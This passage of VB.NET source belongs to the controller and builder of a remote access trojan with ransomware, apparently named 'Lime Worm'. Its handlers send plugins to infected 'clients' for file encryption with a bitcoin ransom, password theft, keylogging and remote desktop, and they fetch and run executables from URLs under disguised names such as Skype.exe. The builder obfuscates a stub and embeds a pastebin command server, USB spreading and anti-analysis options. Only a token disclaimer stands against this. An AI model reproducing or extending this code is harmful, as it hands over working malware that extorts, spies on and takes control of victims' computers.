                    Return DateTime.Parse(string_x).CompareTo(DateTime.Parse(string_y))
                Else
                    Return String.Compare(string_x, string_y)
                End If
            Else
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_y).CompareTo(Val(string_x))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_y).CompareTo(DateTime.Parse(string_x))
                Else
                    Return String.Compare(string_y, string_x)
                End If
            End If
        End Function
    End Class

    Private Sub MetroTabPage1_Enter(sender As Object, e As EventArgs) Handles MetroTabControl1.Click
        On Error Resume Next
        Fix()
    End Sub

    Private Sub MetroToggle1_CheckedChanged(sender As Object, e As EventArgs) Handles MetroToggle1.CheckedChanged
        On Error Resume Next
        If MetroToggle1.Checked = True Then
            Dim simpleSound As New Media.SoundPlayer("c:\Windows\Media\Speech On.wav")
            simpleSound.Play()
        Else
            Dim simpleSound As New Media.SoundPlayer("c:\Windows\Media\Speech Off.wav")
            simpleSound.Play()
        End If

    End Sub

    Private Sub Fix()
        On Error Resume Next
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub Main_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        On Error Resume Next
        Fix()
    End Sub

    Public Function KeyCount()
        Try
            If Not IO.Directory.Exists("Users") Then
                IO.Directory.CreateDirectory("Users")
            End If

            Dim fileCount As Integer = IO.Directory.GetFiles("Users", "KEY.txt", IO.SearchOption.AllDirectories).Length
            Return fileCount
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Public Function SpreadCount()
        Try
            Dim count As Integer = 0
            For Each x As ListViewItem In L1.Items
                If x.SubItems(SP.Index).Text.Contains("Spreaded!") Then
                    count += 1
                End If
            Next
            Return count
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            MetroLabel1.Text = "ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        TOTAL RANSOMWARE ATTACKS [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
        Catch ex As Exception
        End Try
    End Sub

    Private Sub L1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
        Dim BL As New SolidBrush(Color.FromArgb(17, 17, 17))
        Dim LM As New SolidBrush(Color.FromArgb(142, 188, 0))
        e.DrawBackground()
        e.Graphics.FillRectangle(BL, e.Bounds)
        Dim headerFont As New Font("Segoe UI", 8, FontStyle.Bold)
        e.Graphics.DrawString(e.Header.Text, headerFont, LM, e.Bounds)
    End Sub

    Private Sub L1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
        If e.Item.Selected = False Then
            e.DrawDefault = True
        End If
    End Sub

    Private Sub ListViewQuote_DrawSubItem(sender As Object, e As DrawListViewSubItemEventArgs) Handles L1.DrawSubItem
        If e.Item.Selected = True Then
            e.Graphics.FillRectangle(New SolidBrush(Color.FromArgb(142, 188, 0)), e.Bounds)
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, New Font("Segoe UI", 8, FontStyle.Regular), New Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.FromArgb(17, 17, 17))
        Else
            e.DrawDefault = True
        End If
    End Sub

    Private m_SortingColumn As ColumnHeader
    Private Sub L1_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        On Error Resume Next
        ' Get the new sorting column.
        Dim new_sorting_column As ColumnHeader = L1.Columns(e.Column)

        ' Figure out the new sorting order.
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            ' New column. Sort ascending.
            sort_order = SortOrder.Ascending
        Else
            ' See if this is the same column.
            If new_sorting_column.Equals(m_SortingColumn) Then
                ' Same column. Switch the sort order.
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending.
                sort_order = SortOrder.Ascending
            End If

            ' Remove the old sort indicator.
            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        ' Display the new sort order.
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        ' Create a comparer.
        L1.ListViewItemSorter = New ListViewComparer(e.Column, sort_order)

        ' Sort.
        L1.Sort()
        Fix()

    End Sub

    Public Class MyRenderer
        Inherits ToolStripProfessionalRenderer
        Protected Overloads Overrides Sub OnRenderMenuItemBackground(ByVal e As ToolStripItemRenderEventArgs)
            Dim rc As New Rectangle(Point.Empty, e.Item.Size)
            Dim c As Color = IIf(e.Item.Selected, Color.FromArgb(99, 131, 0), Color.FromArgb(17, 17, 17))
            Using brush As New SolidBrush(c)
                e.Graphics.FillRectangle(brush, rc)
            End Using
        End Sub
    End Class



#End Region


#Region "Rightclick"

#Region "Plugins"

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + x.SubItems(ID.Index).Text)
                If _RDP Is Nothing Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll")))
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Public Shared RANS_IMG
    Public Shared RANS_TEXT
    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Try
            Dim R As New Ransomware
            R.ShowDialog()
            Dim result As DialogResult
            If R.OK = True Then
                RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
                RANS_TEXT = R.RichTextBox1.Text
                For Each x As ListViewItem In L1.SelectedItems
                    If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
                        result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                        If result = DialogResult.No Then
                            '
                        ElseIf result = DialogResult.Yes Then
                            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
                        End If
                    Else
                        S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
                    End If
                Next
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
                    Dim result As DialogResult
                    result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)

                    If result = DialogResult.No Then
                        '
                    ElseIf result = DialogResult.Yes Then
                        S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
                    End If
                Else
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub FIleManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FIleManagerToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Dim FM As File_Manager = My.Application.OpenForms("FM" + x.SubItems(ID.Index).Text)
                If FM Is Nothing Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\FM.dll")))
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Dim n As System_Manager = My.Application.OpenForms("Info" + x.SubItems(ID.Index).Text)
                If n Is Nothing Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DET.dll")))
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub STOPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STOPToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOCS.dll")))
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub STARTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STARTToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOC.dll")))
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

#End Region

#Region "PC Options"
    Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-" + SPL + "1")
        Next
    End Sub

    Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-" + SPL + "2")
        Next
    End Sub

    Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-" + SPL + "3")
        Next
    End Sub


#End Region

#Region "Client Options"
    Private Sub UpdateDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateDiskToolStripMenuItem.Click
        On Error Resume Next
        Dim o As New OpenFileDialog
        With o
            .Filter = ".exe (*.exe)|*.exe"
            .Title = "UPDATE"
        End With

        If o.ShowDialog = Windows.Forms.DialogResult.OK Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "CL-" + SPL & "4" + SPL + IO.Path.GetFileName(o.FileName) + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
            Next
        End If
    End Sub

    Private Sub UpdateFromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateFromURLToolStripMenuItem.Click
        On Error Resume Next
        Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "CL-" + SPL + "5" + SPL + URL + SPL + EXE)
            Next
        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "CL-" + SPL + "2")
        Next
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "CL-" + SPL + "1")
        Next
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        On Error Resume Next
        Dim result As DialogResult
        For Each x As ListViewItem In L1.SelectedItems
            If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Encrypted" Then
                result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                If result = DialogResult.Yes Then
                    S.Send(x.Tag, "CL-" + SPL + "3")
                End If
            Else
                S.Send(x.Tag, "CL-" + SPL + "3")
            End If
        Next
    End Sub

#End Region

#Region "Others"

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Dim KL As File_Manager = My.Application.OpenForms("KL" + x.SubItems(ID.Index).Text)
                If KL Is Nothing Then
                    S.Send(x.Tag, "KL")
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        About.Show()
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Title = "RUN"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then

                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "RD-" & SPL & o.FileName & SPL & Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Dim URL As String = InputBox("Enter the direct link", "Run File", "http: //site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RU-" & SPL & URL & SPL & EXE)
            Next
        End If
    End Sub

    Private Sub VisitURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitURLToolStripMenuItem.Click
        On Error Resume Next
        Dim URL As String = InputBox("Enter URL", "Visit URL", "http://google.com")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            If Not URL.StartsWith("http") Then
                URL = "http://" + URL
            End If
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "Visit" + SPL + URL)
            Next
        End If
    End Sub

    Private Sub NoteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NoteToolStripMenuItem.Click
        On Error Resume Next
        Dim note As String = InputBox("Enter note", "", "")

        For Each x As ListViewItem In L1.SelectedItems
            STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Note", note)
            x.SubItems(NOTE_.Index).Text = note
        Next
    End Sub

    Private Sub ClientColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClientColorToolStripMenuItem.Click
        On Error Resume Next

        Dim cDialog As New ColorDialog
        For Each x As ListViewItem In L1.SelectedItems
            If (cDialog.ShowDialog() = DialogResult.OK) Then
                x.ForeColor = cDialog.Color
                Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
                STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color", CCC)
            Else
                DLV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color")
                x.ForeColor = Color.FromArgb(142, 188, 0)
            End If
        Next

    End Sub






#End Region

#End Region


#Region "Builder"

    Private Sub MetroButton1_Click(sender As Object, e As EventArgs) Handles MetroButton1.Click
        Try
            Dim result As DialogResult
            result = MessageBox.Show("I, the creator, am not responsible for any actions, and or damages, caused by this software. " & vbNewLine & vbNewLine & "You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only." & vbNewLine & vbNewLine & "This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use." & vbNewLine & vbNewLine & "By pressing ""YES"" button, you automatically agree to the above.", "Lime Worm | Disclaimer" & vbNewLine & vbNewLine, MessageBoxButtons.YesNo)
            If result = DialogResult.No Then
                Return
            ElseIf result = DialogResult.Yes Then

                If radioNET2.Checked Then
                    If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe") Then
                        Shell("C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & "", AppWinStyle.Hide, False, -1)
                        Threading.Thread.Sleep(2000)
                    Else
                        MsgBox("Framework 2.0 is not installed!", MsgBoxStyle.Critical, Nothing)
                        Return
                    End If
                Else
                    If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe") Then
                        Shell("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & "", AppWinStyle.Hide, False, -1)
                        Threading.Thread.Sleep(2000)
                    Else
                        MsgBox("Framework 4.0 is not installed!", MsgBoxStyle.Critical, Nothing)
                        Return
                    End If
                End If

                If _exe.Text = "" Then
                    _exe.Text = "Wservices.exe"
                End If

                If _path1.Text = "" Then
                    _path1.Text = "Temp"
                End If

                If Not _exe.Text.EndsWith(".exe") Then
                    _exe.Text = _exe.Text + ".exe"
                End If

                If Not _path2.Text.StartsWith("\") Then
                    _path2.Text = "\" + _path2.Text
                End If
                If Not _path2.Text.EndsWith("\") Then
                    _path2.Text = _path2.Text + "\"
                End If

                If Not IO.File.Exists(Application.StartupPath & "\Misc\Stub\Stub.exe") Then
                        MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
                        Return
                    ElseIf _pastebin.Text = "" Or Not _pastebin.Text.Contains("http") Then
                        MsgBox("Enter pastebin raw url", MsgBoxStyle.Critical, Nothing)
                        Return
                    Else

                        Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\Misc\Stub\Stub.exe")
                        If chkRename.Checked Then
                            definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(6, 20)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
                        End If
                        Dim definition2 As ModuleDefinition
                        For Each definition2 In definition.Modules
                            If chkRename.Checked Then
                                definition2.Name = Randomi(rand.Next(10, 30))
                            End If
                            Dim definition3 As TypeDefinition
                            For Each definition3 In definition2.Types
                                If chkRename.Checked Then
                                    ' If definition3.Namespace = "Client.Lime" Then
                                    definition3.Namespace = Randomi(rand.Next(10, 30))
                                    definition3.Name = Randomi(rand.Next(10, 30))
                                    '  End If
                                    For Each F In definition3.Fields
                                        F.Name = Randomi(rand.Next(10, 30))
                                    Next
                                End If
                                Dim definition4 As MethodDefinition
                                For Each definition4 In definition3.Methods
                                    If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
                                        If chkRename.Checked Then
                                            definition4.Name = Randomi(rand.Next(10, 30))
                                            For Each P As ParameterDefinition In definition4.Parameters
                                                P.Name = Randomi(rand.Next(5, 10))
                                            Next
                                        End If
                                    ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                        Dim enumerator As IEnumerator(Of Instruction)
                                        Try
                                            enumerator = definition4.Body.Instructions.GetEnumerator
                                            Do While enumerator.MoveNext
                                                Dim current As Instruction = enumerator.Current
                                                If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                                    Dim str As String = current.Operand.ToString
                                                    If (str = "%Delay%") Then
                                                        current.Operand = _numDelay.Value.ToString
                                                    End If
                                                    If (str = "%Pastebin%") Then
                                                        current.Operand = S_Encryption.AES_Encrypt(_pastebin.Text)
                                                    End If
                                                    If (str = "%EXE%") Then
                                                        current.Operand = _exe.Text
                                                    End If
                                                    If (str = "%SPL%") Then
                                                        current.Operand = S_Settings.SPL
                                                    End If
                                                    If (str = "%KEY%") Then
                                                        current.Operand = S_Settings.KEY
                                                    End If
                                                    If (str = "%PASS%") Then
                                                        current.Operand = S_Settings.EncryptionKey
                                                    End If
                                                    If (str = "%DROP%") Then
                                                        current.Operand = _drop.Checked.ToString
                                                    End If
                                                    If (str = "%PATH1%") Then
                                                        current.Operand = _path1.Text
                                                    End If
                                                    If (str = "%PATH2%") Then
                                                        current.Operand = _path2.Text
                                                    End If
                                                    If (str = "%BTC_ADDR%") Then
                                                        current.Operand = _btc.Text
                                                    End If
                                                    If (str = "%USB%") Then
                                                        current.Operand = _usb.Checked.ToString
                                                    End If
                                                    If (str = "%PIN%") Then
                                                        current.Operand = _pin.Checked.ToString
                                                    End If
                                                    If (str = "%ANTI%") Then
                                                        current.Operand = _anti.Checked.ToString
                                                    End If
                                                    If (str = "%DWN_CHK%") Then
                                                        current.Operand = _dwnchk.Checked.ToString
                                                    End If
                                                    If (str = "%DWN_LINK%") Then
                                                        current.Operand = _dwnlink.Text
                                                    End If
                                                End If
                                            Loop
                                        Finally
                                        End Try

                                    End If
                                Next
                            Next
                        Next

                        definition.Write(Application.StartupPath + "\" + "NEW CLIENT.exe")
                        If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
                            S_IconChanger.InjectIcon(Application.StartupPath + "\" + "NEW CLIENT.exe", PictureBox1.ImageLocation)
                        End If
                        MsgBox("Your Client Has been Created Successfully", vbInformation, "DONE!")
                        My.Settings.Save()
                        definition.Dispose()
                        Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
                    End If
                End If
        Catch ex1 As Exception
            MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
            Return
        End Try

    End Sub

    Private Sub _drop_CheckedChanged(sender As Object, e As EventArgs) Handles _drop.CheckedChanged
        If _drop.Checked = True Then
            _exe.Enabled = True
            _path1.Enabled = True
            _path2.Enabled = True
        Else
            _exe.Enabled = False
            _path1.Enabled = False
            _path2.Enabled = False
        End If
    End Sub

    Private Sub MetroTile1_Click(sender As Object, e As EventArgs) Handles MetroTile1.Click
        Try : BackgroundWorker2.RunWorkerAsync() : Catch : End Try
    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        Try
            Dim x As String
            Dim wc As New Net.WebClient
            Dim rx As New Text.RegularExpressions.Regex("^(?:(?:25[0-5]|2[0-4]\d|[01]\d\d|\d?\d)(?(?=\.?\d)\.)){4}$")
            x = wc.DownloadString(_pastebin.Text)

            If rx.IsMatch(x.Split(":")(0)) AndAlso x.Split(":")(1) <= 65535 Then
                If x.Split(":")(0) = GetExternalAddress() AndAlso x.Split(":")(1) = S_Settings.PORT Then
                    MsgBox("Valid! " + x, MsgBoxStyle.Information)
                ElseIf x.Split(":")(0) = GetExternalAddress() AndAlso x.Split(":")(1) <> S_Settings.PORT Then
                    MsgBox("Valid! " + x + Environment.NewLine + "But port doesn't match your current port", MsgBoxStyle.Information)
                ElseIf x.Split(":")(0) <> GetExternalAddress() AndAlso x.Split(":")(1) = S_Settings.PORT Then
                    MsgBox("Valid! " + x + Environment.NewLine + "But IP doesn't match your current IP", MsgBoxStyle.Information)
                ElseIf x.Split(":")(0) <> GetExternalAddress() AndAlso x.Split(":")(1) <> S_Settings.PORT Then
                    MsgBox("Valid! " + x + Environment.NewLine + "But IP and port doesn't match your current settings", MsgBoxStyle.Information)
                End If
            Else
                MsgBox("Wrong format", MsgBoxStyle.Critical)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub

    Private Sub _icon_CheckedChanged(sender As Object, e As EventArgs) Handles _icon.CheckedChanged
        Try
            If _icon.Checked = True Then
                Dim o As New OpenFileDialog
                With o
                    .Filter = "*.ico (*.ico)| *.ico"
                    .InitialDirectory = Application.StartupPath + "\Misc\Icons"
                    .Title = "Select Icon"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    PictureBox1.ImageLocation = o.FileName
                Else
                    _icon.Checked = False
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub


#End Region


End Class